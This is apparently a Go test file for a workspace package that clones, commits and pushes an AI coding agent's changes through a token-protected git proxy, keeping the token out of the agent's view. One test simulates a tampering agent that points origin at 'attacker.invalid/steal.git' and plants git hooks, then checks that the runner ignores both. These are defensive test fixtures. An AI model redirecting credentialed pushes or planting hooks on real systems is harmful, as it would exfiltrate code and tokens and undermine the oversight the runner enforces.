package workspace

import (
	"encoding/base64"
	"net/http"
	"net/http/cgi"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

const token = "fgp1.test-token.sig"

type upstream struct {
	bare string
	url  string // clone URL of the repo
	mu   sync.Mutex
	auth []string
}

// isolateGit keeps the developer's git configuration out of the tests.
func isolateGit(t *testing.T) {
	t.Helper()
	t.Setenv("HOME", t.TempDir())
	t.Setenv("GIT_CONFIG_GLOBAL", os.DevNull)
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
}

func run(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.CommandContext(t.Context(), "git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=seed", "GIT_AUTHOR_EMAIL=seed@x", "GIT_COMMITTER_NAME=seed", "GIT_COMMITTER_EMAIL=seed@x")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

// newUpstream serves a bare repo seeded with main, accepting only the step token,
// standing in for the control plane git proxy.
func newUpstream(t *testing.T) *upstream {
	t.Helper()
	isolateGit(t)
	gitPath, err := exec.LookPath("git")
	if err != nil {
		t.Fatalf("git is required: %v", err)
	}
	root := t.TempDir()
	u := &upstream{bare: filepath.Join(root, "toy.git")}
	run(t, root, "init", "--bare", "-b", "main", u.bare)
	run(t, u.bare, "config", "http.receivepack", "true")
	seed := t.TempDir()
	run(t, seed, "init", "-b", "main")
	writeFile(t, seed, "README.md", "toy\n")
	run(t, seed, "add", ".")
	run(t, seed, "commit", "-m", "seed")
	run(t, seed, "push", u.bare, "main")

	backend := &cgi.Handler{Path: gitPath, Args: []string{"http-backend"},
		Env: []string{"GIT_PROJECT_ROOT=" + root, "GIT_HTTP_EXPORT_ALL=1", "PATH=" + os.Getenv("PATH")}}
	want := "Basic " + base64.StdEncoding.EncodeToString([]byte("x-token:"+token))
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		u.mu.Lock()
		u.auth = append(u.auth, r.Header.Get("Authorization"))
		u.mu.Unlock()
		if r.Header.Get("Authorization") != want {
			w.Header().Set("WWW-Authenticate", `Basic realm="proxy"`)
			http.Error(w, "token required", http.StatusUnauthorized)
			return
		}
		backend.ServeHTTP(w, r)
	}))
	t.Cleanup(srv.Close)
	u.url = srv.URL + "/toy.git"
	return u
}

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func (u *upstream) config(t *testing.T, base, branch string) Config {
	return Config{
		Dir: filepath.Join(t.TempDir(), "workspace"), CloneURL: u.url, Token: token,
		BaseRef: base, Branch: branch, CommitMessage: "frk-42: agent changes",
		AuthorName: "frankie-agent", AuthorEmail: "agent@frankie.invalid",
	}
}

func (u *upstream) ref(t *testing.T, ref string) string {
	t.Helper()
	cmd := exec.CommandContext(t.Context(), "git", "rev-parse", "--verify", "-q", ref)
	cmd.Dir = u.bare
	out, _ := cmd.Output()
	return strings.TrimSpace(string(out))
}

func TestPrepareAndPublish(t *testing.T) {
	u := newUpstream(t)
	cfg := u.config(t, "main", "agent/frk-42/fix-login")
	mainBefore := u.ref(t, "refs/heads/main")

	w, err := Prepare(t.Context(), cfg)
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	if w.BaseSHA() != mainBefore {
		t.Errorf("base %s, want main %s", w.BaseSHA(), mainBefore)
	}
	if got := run(t, cfg.Dir, "branch", "--show-current"); got != cfg.Branch {
		t.Errorf("checked out %q, want %q", got, cfg.Branch)
	}
	// The token never reaches disk or `git remote -v` (which agents run).
	gitConfig, _ := os.ReadFile(filepath.Join(cfg.Dir, ".git", "config"))
	if strings.Contains(string(gitConfig), token) || strings.Contains(run(t, cfg.Dir, "remote", "-v"), token) {
		t.Fatal("token leaked into the workspace")
	}

	// The agent commits one change itself and leaves others uncommitted.
	writeFile(t, cfg.Dir, "login.go", "package login\n")
	run(t, cfg.Dir, "add", "login.go")
	run(t, cfg.Dir, "commit", "-m", "agent commit")
	writeFile(t, cfg.Dir, "README.md", "toy\nfixed login\n")
	writeFile(t, cfg.Dir, "docs/notes.md", "notes\n")

	res, err := w.Publish(t.Context())
	if err != nil {
		t.Fatalf("Publish: %v", err)
	}
	if !res.Pushed || res.CommitSHA == w.BaseSHA() || u.ref(t, "refs/heads/"+cfg.Branch) != res.CommitSHA {
		t.Fatalf("result %+v; upstream branch at %q", res, u.ref(t, "refs/heads/"+cfg.Branch))
	}
	if u.ref(t, "refs/heads/main") != mainBefore {
		t.Error("main moved")
	}
	paths := map[string]string{}
	for _, d := range res.Diffs {
		paths[d.Path] = d.Diff
	}
	if len(paths) != 3 || !strings.Contains(paths["README.md"], "+fixed login") || !strings.Contains(paths["login.go"], "+package login") || paths["docs/notes.md"] == "" {
		t.Errorf("diffs = %v", paths)
	}
	if author := run(t, cfg.Dir, "log", "-1", "--format=%an <%ae>|%s"); author != "frankie-agent <agent@frankie.invalid>|frk-42: agent changes" {
		t.Errorf("runner commit = %q", author)
	}
	if status := run(t, cfg.Dir, "status", "--porcelain"); status != "" {
		t.Errorf("uncommitted changes after publish: %q", status)
	}
}

func TestPublishWithoutChangesPushesNothing(t *testing.T) {
	u := newUpstream(t)
	cfg := u.config(t, "main", "agent/frk-42/noop")
	w, err := Prepare(t.Context(), cfg)
	if err != nil {
		t.Fatal(err)
	}
	res, err := w.Publish(t.Context())
	if err != nil {
		t.Fatalf("Publish: %v", err)
	}
	if res.Pushed || res.CommitSHA != w.BaseSHA() || len(res.Diffs) != 0 {
		t.Errorf("result %+v; want nothing pushed at the base commit", res)
	}
	if u.ref(t, "refs/heads/"+cfg.Branch) != "" {
		t.Error("branch created upstream for an empty session")
	}
}

// FR-SB-6: a later step continues from the issue branch the previous step pushed.
func TestNextStepContinuesIssueBranch(t *testing.T) {
	u := newUpstream(t)
	first := u.config(t, "main", "agent/frk-42/fix")
	w1, err := Prepare(t.Context(), first)
	if err != nil {
		t.Fatal(err)
	}
	writeFile(t, first.Dir, "a.txt", "a\n")
	r1, err := w1.Publish(t.Context())
	if err != nil {
		t.Fatal(err)
	}

	second := u.config(t, "agent/frk-42/fix", "agent/frk-42/fix")
	w2, err := Prepare(t.Context(), second)
	if err != nil {
		t.Fatalf("Prepare from the issue branch: %v", err)
	}
	if w2.BaseSHA() != r1.CommitSHA {
		t.Fatalf("second step based on %s, want %s", w2.BaseSHA(), r1.CommitSHA)
	}
	writeFile(t, second.Dir, "b.txt", "b\n")
	r2, err := w2.Publish(t.Context())
	if err != nil {
		t.Fatalf("Publish (fast-forward): %v", err)
	}
	if len(r2.Diffs) != 1 || r2.Diffs[0].Path != "b.txt" {
		t.Errorf("second step diffs = %+v; want only its own change", r2.Diffs)
	}
}

// The agent controls .git/config and hooks; the runner's push must not follow them.
func TestPublishIgnoresAgentTampering(t *testing.T) {
	u := newUpstream(t)
	cfg := u.config(t, "main", "agent/frk-42/tamper")
	w, err := Prepare(t.Context(), cfg)
	if err != nil {
		t.Fatal(err)
	}
	run(t, cfg.Dir, "remote", "set-url", "origin", "http://attacker.invalid/steal.git")
	marker := filepath.Join(t.TempDir(), "hook-ran")
	writeFile(t, cfg.Dir, ".git/hooks/pre-push", "#!/bin/sh\ntouch "+marker+"\n")
	writeFile(t, cfg.Dir, ".git/hooks/pre-commit", "#!/bin/sh\ntouch "+marker+"\nexit 1\n")
	for _, h := range []string{"pre-push", "pre-commit"} {
		if err := os.Chmod(filepath.Join(cfg.Dir, ".git/hooks", h), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	writeFile(t, cfg.Dir, "x.txt", "x\n")

	res, err := w.Publish(t.Context())
	if err != nil {
		t.Fatalf("Publish: %v", err)
	}
	if u.ref(t, "refs/heads/"+cfg.Branch) != res.CommitSHA {
		t.Error("push did not reach the configured clone URL")
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("an agent-planted hook ran during publish")
	}
}

func TestPrepareErrors(t *testing.T) {
	u := newUpstream(t)

	nonEmpty := u.config(t, "main", "agent/frk-42/x")
	writeFile(t, nonEmpty.Dir, "leftover", "x")
	if _, err := Prepare(t.Context(), nonEmpty); err == nil || !strings.Contains(err.Error(), "not empty") {
		t.Errorf("non-empty dir: err = %v", err)
	}

	missingBase := u.config(t, "does-not-exist", "agent/frk-42/x")
	if _, err := Prepare(t.Context(), missingBase); err == nil {
		t.Error("missing base ref: no error")
	}

	badToken := u.config(t, "main", "agent/frk-42/x")
	badToken.Token = "fgp1.wrong.token"
	_, err := Prepare(t.Context(), badToken)
	if err == nil {
		t.Fatal("wrong token: no error")
	}
	if strings.Contains(err.Error(), badToken.Token) {
		t.Errorf("error leaks the token: %v", err)
	}
}

func TestValidate(t *testing.T) {
	ok := Config{Dir: "/w", CloneURL: "http://cp:8081/git/toy.git", Token: "t", BaseRef: "main",
		Branch: "agent/frk-1/x", CommitMessage: "m", AuthorName: "a", AuthorEmail: "a@x"}
	if err := ok.Validate(); err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}
	for name, mutate := range map[string]func(*Config){
		"no dir":           func(c *Config) { c.Dir = "" },
		"ssh url":          func(c *Config) { c.CloneURL = "git@github.com:x/y.git" },
		"url with creds":   func(c *Config) { c.CloneURL = "http://u:p@cp/git/toy.git" },
		"no token":         func(c *Config) { c.Token = "" },
		"no base":          func(c *Config) { c.BaseRef = "" },
		"non-agent branch": func(c *Config) { c.Branch = "main" },
		"no author":        func(c *Config) { c.AuthorEmail = "" },
	} {
		c := ok
		mutate(&c)
		if err := c.Validate(); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestLargeDiffIsCapped(t *testing.T) {
	u := newUpstream(t)
	cfg := u.config(t, "main", "agent/frk-42/big")
	w, err := Prepare(t.Context(), cfg)
	if err != nil {
		t.Fatal(err)
	}
	writeFile(t, cfg.Dir, "big.txt", strings.Repeat("line of text\n", 30_000))
	res, err := w.Publish(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Diffs) != 1 || len(res.Diffs[0].Diff) > maxDiffBytes+64 || !strings.Contains(res.Diffs[0].Diff, "[truncated") {
		t.Errorf("diff not capped: %d bytes", len(res.Diffs[0].Diff))
	}
}
